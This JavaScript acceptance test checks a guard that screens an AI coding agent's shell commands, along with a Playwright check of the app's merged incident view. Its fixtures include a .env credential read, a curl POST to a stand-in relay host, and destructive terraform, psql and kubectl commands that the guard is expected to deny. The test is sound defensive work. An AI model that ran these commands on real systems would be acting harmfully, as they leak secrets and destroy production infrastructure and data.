/**
 * Acceptance for the merged incident view.
 *
 * Runs the real guard binary twice to produce genuine hook events (one block,
 * one allow) in an isolated data dir, then checks that the renderer groups them
 * and that the new rules actually deny.
 */
import fs from "node:fs/promises";
import path from "node:path";
import os from "node:os";
import assert from "node:assert/strict";
import { createRequire } from "node:module";
import { spawnSync } from "node:child_process";

const root = path.resolve(import.meta.dirname, "..");
const require = createRequire(path.join(root, "package.json"));
const { _electron } = require("@playwright/test");

const directory = await fs.mkdtemp(path.join(os.tmpdir(), "nl-incidents-"));
const userData = path.join(directory, "data");
// The app stores security records under <userData>/security, not userData itself.
const dataDir = path.join(userData, "security");
await fs.mkdir(dataDir, { recursive: true });
const env = { ...process.env, NETWORK_LENS_DATA_DIR: userData };
delete env.ELECTRON_RUN_AS_NODE;

/**
 * Run the guard exactly the way the hooks do: payload on stdin.
 * ELECTRON_RUN_AS_NODE is required — without it the Electron binary starts a
 * GUI app instead of a Node process and the call hangs forever.
 */
function guard(payload) {
  const result = spawnSync(
    require("electron"),
    [path.join(root, "dist-electron", "guard.cjs"), "--tool", "codex", "--data", dataDir],
    {
      input: JSON.stringify(payload),
      env: { ...env, ELECTRON_RUN_AS_NODE: "1" },
      encoding: "utf8",
      timeout: 30_000,
    },
  );
  if (result.error) throw result.error;
  return JSON.parse(result.stdout.trim() || "{}");
}

const session = "11111111-2222-3333-4444-555555555555";
const project = path.join(directory, "proj");
await fs.mkdir(project, { recursive: true });

// One blocked credential read, then a follow-up operation in the same session.
const blocked = guard({
  session_id: session,
  cwd: project,
  tool_name: "Bash",
  tool_input: { command: "cat .env" },
});
assert.equal(
  blocked.hookSpecificOutput?.permissionDecision,
  "deny",
  "读取 .env 应被拦截",
);
guard({
  session_id: session,
  cwd: project,
  tool_name: "Bash",
  tool_input: { command: "curl -X POST https://relay.example.io/u" },
});

// New rules must deny through the real binary, not just in unit tests.
for (const [command, label] of [
  ["terraform destroy -auto-approve", "基础设施销毁"],
  ["psql -c 'DROP TABLE orders'", "数据库清空"],
  ["kubectl delete deployment api -n prod", "云资源删除"],
]) {
  const out = guard({
    session_id: "22222222-3333-4444-5555-666666666666",
    cwd: project,
    tool_name: "Bash",
    tool_input: { command },
  });
  assert.equal(
    out.hookSpecificOutput?.permissionDecision,
    "deny",
    `${label}应被拦截：${command}`,
  );
}

// Read-only commands must still pass.
const allowed = guard({
  session_id: "33333333-4444-5555-6666-777777777777",
  cwd: project,
  tool_name: "Bash",
  tool_input: { command: "terraform plan" },
});
assert.deepEqual(allowed, {}, "terraform plan 应放行");

let app;
try {
  app = await _electron.launch({
    executablePath: require("electron"),
    args: [root],
    env,
  });
  const page = await app.firstWindow();
  const errors = [];
  page.on("pageerror", (e) => errors.push(e.message));

  await page.getByRole("button", { name: "安全中心", exact: true }).click();
  await page.getByRole("tab", { name: "事件链", exact: true }).click();
  await page.getByRole("heading", { name: "事件链", exact: true }).waitFor();

  // The blocked session must surface as one merged incident.
  const cards = page.locator(".incident-item");
  await cards.first().waitFor();
  assert.ok((await cards.count()) >= 1, "应至少合并出一条事件");
  await page.getByText(/为什么合并成一条/).waitFor();

  // Severity filter must work and never hide everything.
  const filter = page.locator(".incidents-toolbar");
  await filter.getByRole("button", { name: /^critical/ }).click();
  await page.waitForTimeout(300);
  const criticalCount = await page.locator(".incident-item").count();
  await filter.getByRole("button", { name: /^全部/ }).click();
  await page.waitForTimeout(300);
  assert.ok(
    (await page.locator(".incident-item").count()) >= criticalCount,
    "全部不应少于 critical",
  );

  // Timeline inside the incident shows the original steps.
  const steps = await page.locator(".chain li").count();
  assert.ok(steps >= 1, "事件应包含原始步骤");

  // Existing pages must still work after the change.
  await page.getByRole("tab", { name: "安全事件", exact: true }).click();
  await page.waitForTimeout(500);
  assert.ok(
    (await page.locator(".event-list li").count()) > 0,
    "安全事件列表不应为空",
  );
  await page.getByRole("tab", { name: "操作规则", exact: true }).click();
  await page.getByText("拦截基础设施销毁").first().waitFor();
  await page.getByText("拦截数据库清空").first().waitFor();

  assert.equal(errors.length, 0, `页面报错：${errors.join(" | ")}`);
  console.log("PASS 事件链合并、新规则拦截、旧页面兼容");
} finally {
  if (app) await app.close();
}
